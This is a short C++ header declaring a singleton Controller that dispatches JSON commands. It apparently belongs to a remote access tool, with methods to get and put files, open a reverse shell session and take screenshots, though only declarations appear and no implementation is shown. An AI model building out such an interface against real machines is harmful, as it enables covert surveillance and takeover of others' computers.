#pragma once

#include "json.hpp"

#include <string>

class Controller {
private:
	Controller();
	static void sendErrorResponse(long long, const std::string& error);
public:
	static Controller& getInstance();
	static void dispatch(std::string message);
	static void getFile(nlohmann::json message);
	static void putFile(nlohmann::json message);
	static void createReverseShellSession(nlohmann::json message);
	static void getScreenshot(nlohmann::json message);
};
